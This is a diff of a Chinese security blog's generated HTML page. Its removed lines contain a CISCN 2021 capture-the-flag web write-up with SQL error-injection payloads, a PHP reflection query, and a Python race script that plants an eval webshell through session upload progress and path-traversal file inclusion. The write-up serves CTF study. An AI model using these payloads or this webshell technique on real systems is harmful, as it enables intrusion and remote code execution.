@@ -7,17 +7,27 @@
   
   
   
-  <title>nappingCat&#39;s Blog</title>
+  <title>蓝帽杯-One Pointer PHP | nappingCat&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="2571374157@qq.com">
-<meta property="og:type" content="website">
-<meta property="og:title" content="nappingCat&#39;s Blog">
-<meta property="og:url" content="https://123-prog.github.io/index.html">
+  <meta name="description" content="0x01 反序列化漏洞利用实现php任意代码执行源码： 1234567891011121314151617&#x2F;&#x2F;add_api.php&lt;?phpinclude &quot;user.php&quot;;if($user&#x3D;unserialize($_COOKIE[&quot;data&quot;]))&amp;#123;	$count[++$user-&gt;count]&#x3D;1;	if($count[]&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蓝帽杯-One Pointer PHP">
+<meta property="og:url" content="https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/index.html">
 <meta property="og:site_name" content="nappingCat&#39;s Blog">
-<meta property="og:description" content="2571374157@qq.com">
+<meta property="og:description" content="0x01 反序列化漏洞利用实现php任意代码执行源码： 1234567891011121314151617&#x2F;&#x2F;add_api.php&lt;?phpinclude &quot;user.php&quot;;if($user&#x3D;unserialize($_COOKIE[&quot;data&quot;]))&amp;#123;	$count[++$user-&gt;count]&#x3D;1;	if($count[]&#x3D;">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/Snipaste_2021-05-05_22-50-16.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/Snipaste_2021-05-05_22-51-49.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/Snipaste_2021-05-05_22-52-03.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/Snipaste_2021-05-05_22-58-43.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/Snipaste_2021-05-05_23-11-20.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/Blog/blog/source_posts/蓝帽杯-One-Pointer-PHP/Snipaste_2021-05-05_23-14-01.png">
+<meta property="article:published_time" content="2021-05-05T14:26:06.000Z">
+<meta property="article:modified_time" content="2021-05-17T14:44:18.107Z">
 <meta property="article:author" content="nappingCat">
+<meta property="article:tag" content="反序列化，SSRF攻击php-fpm，提权">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/Snipaste_2021-05-05_22-50-16.png">
   
     <link rel="alternative" href="/atom.xml" title="nappingCat&#39;s Blog" type="application/atom+xml">
   
@@ -35,9 +45,6 @@
   <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
   <link rel="apple-touch-icon" href="/apple-touch-icon.png">
   
-    
-    
-  
   
       <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
   
@@ -48,8 +55,8 @@
       var yiliaConfig = {
           fancybox: true,
           animate: true,
-          isHome: true,
-          isPost: false,
+          isHome: false,
+          isPost: true,
           isArchive: false,
           isTag: false,
           isCategory: false,
@@ -246,99 +253,7 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-CISCN2021-web部分wp" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/" class="article-date">
-      <time datetime="2021-05-18T14:26:06.000Z" itemprop="datePublished">2021-05-18</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/">CISCN 2021 web 部分wp</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="0x01-easy-sql"><a href="#0x01-easy-sql" class="headerlink" title="0x01 easy_sql"></a>0x01 easy_sql</h2><p>报错注入，过滤了information，sys，innodb，union等等</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;) and polygon(id)#</span><br></pre></td></tr></table></figure>
-<p>报错得到数据库名和users表，但flag没在users表，这里盲猜有个flag表</p>
-<p>利用两个表连接不能出现同名字段进行报错爆出flag的字段名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;) and (select * from (select * from flag as a join flag as b) as c)#   </span><br><span class="line">uname&#x3D;&#39;) and (select * from (select * from flag as a join flag as b using(id)) as c)#</span><br><span class="line">uname&#x3D;&#39;) and (select * from (select * from flag as a join flag as b using(id,no)) as c)#</span><br></pre></td></tr></table></figure>
-<p>得到flag表字段</p>
-<p><code>id,no,851c91cb-b14d-49b2-8feb-4764c1c2b855</code></p>
-<p>最后paload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;) and updatexml(1,(select &#96;851c91cb-b14d-49b2-8feb-4764c1c2b855&#96; from flag),1)#</span><br></pre></td></tr></table></figure>
-<p>这题也可以布尔盲注，但注意数据库的字符比较不区分大小写，要想区分大小写的比较，有两种方法</p>
-<p><code>1.binary()</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select binary(&#39;A&#39;))&#x3D;(select &#39;a&#39;);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| (select binary(&#39;A&#39;))&#x3D;(select &#39;a&#39;) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 0 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p><code>2.拼接json字符</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select concat(&#39;A&#39;,cast(0 as json)))&#x3D;(select &#39;a&#39;);</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| (select concat(&#39;A&#39;,cast(0 as json)))&#x3D;(select &#39;a0&#39;) |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">|                                                  0 |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-easy-source"><a href="#0x02-easy-source" class="headerlink" title="0x02 easy_source"></a>0x02 easy_source</h2><p>源码泄露<code>.index.php.swo</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure>
-<p>只有这个源码，根据提示，源码可能藏在上面那些函数的注释里面，利用php的内置类<code>ReflectionMethod</code>读取<code>User</code>类中函数的注释</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;a&amp;rd&#x3D;getDocComment</span><br></pre></td></tr></table></figure>
-<p>爆破rb值，最后在函数q中找到flag注释</p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-middle-source"><a href="#0x03-middle-source" class="headerlink" title="0x03 middle_source"></a>0x03 middle_source</h2><p>隐藏目录<code>./listing</code></p>
-<p>访问拿到<code>you_can_seeeeeeee_me.php</code>，发现是一个phpinfo</p>
-<p>其中可以拿到session的存放位置<code>var/lib/php/sessions/caaceaafdf</code>，而且session的文件名可控，可以结合session文件包含拿到shell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;cat&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;echo &#x27;nappingCat&#x27;;var_dump(scandir(&#x27;/etc&#x27;));&quot;</span>,</span><br><span class="line">    <span class="string">&quot;field&quot;</span>:<span class="string">&quot;xx&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cf&quot;</span>:<span class="string">&#x27;../../../../../var/lib/php/sessions/caaceaafdf/sess_&#x27;</span>+sessid</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://124.70.16.213:23295/index.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://124.70.16.213:23295/index.php&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;nappingCat&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-<p>直接扫etc目录，找到那个奇怪的文件夹，再往里扫，最后得到路径</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;iacfjhcabh&#x2F;cgbddjhfeb&#x2F;cdbegaahag&#x2F;jcgbebcfdd&#x2F;cdecajbgcf&#x2F;fl444444g</span><br></pre></td></tr></table></figure>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cf &#x3D; ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;iacfjhcabh&#x2F;cgbddjhfeb&#x2F;cdbegaahag&#x2F;jcgbebcfdd&#x2F;cdecajbgcf&#x2F;fl444444g</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CISCN/" rel="tag">CISCN</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-蓝帽杯-One-Pointer-PHP" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-蓝帽杯-One-Pointer-PHP" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
       <a  href="/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/" class="article-date">
@@ -355,13 +270,24 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/">蓝帽杯-One Pointer PHP</a>
+    <h1 class="article-title" itemprop="name">
+      蓝帽杯-One Pointer PHP
     </h1>
   
 
 
       </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8CSSRF%E6%94%BB%E5%87%BBphp-fpm%EF%BC%8C%E6%8F%90%E6%9D%83/" rel="tag">反序列化，SSRF攻击php-fpm，提权</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
       
     
     <div class="article-entry" itemprop="articleBody">
@@ -421,577 +347,152 @@
       
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8CSSRF%E6%94%BB%E5%87%BBphp-fpm%EF%BC%8C%E6%8F%90%E6%9D%83/" rel="tag">反序列化，SSRF攻击php-fpm，提权</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
   </div>
   
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-SSRF之gopher协议利用" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/" class="article-date">
-      <time datetime="2021-04-27T04:13:57.000Z" itemprop="datePublished">2021-04-27</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
     
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/">SSRF之gopher协议利用</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h1 id="SSRF之gopher协议的利用"><a href="#SSRF之gopher协议的利用" class="headerlink" title="SSRF之gopher协议的利用"></a>SSRF之gopher协议的利用</h1><h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>格式：</p>
-<p><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p>
-<p>一个下划线可以替换成任意字符，但必须有不然数据流的第一个字符会被吞掉</p>
-<p>大概使用如下</p>
-<p>开一个在1234端口的监听</p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a   href="/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/#more">查看更多 >></a>
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/">蓝帽杯-One Pointer PHP</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问 nappingCat 的个人博客">nappingCat</a></p>
+        <p><span>发布时间:</span>2021年05月05日 - 22时26分</p>
+        <p><span>最后更新:</span>2021年05月17日 - 22时44分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/" title="蓝帽杯-One Pointer PHP">https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/　　作者: nappingCat" title=""></span>
         </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-DASCTF-三月赛-web题复现" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/04/07/DASCTF-%E4%B8%89%E6%9C%88%E8%B5%9B-web%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="article-date">
-      <time datetime="2021-04-07T07:04:52.000Z" itemprop="datePublished">2021-04-07</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/04/07/DASCTF-%E4%B8%89%E6%9C%88%E8%B5%9B-web%E9%A2%98%E5%A4%8D%E7%8E%B0/">DASCTF 三月赛 web题复现</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <h2 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a>BestDB</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>源码给了查询语句</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id = &#x27;<span class="subst">$query</span>&#x27; OR username = \&quot;<span class="subst">$query</span>\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DASCTF/" rel="tag">DASCTF</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
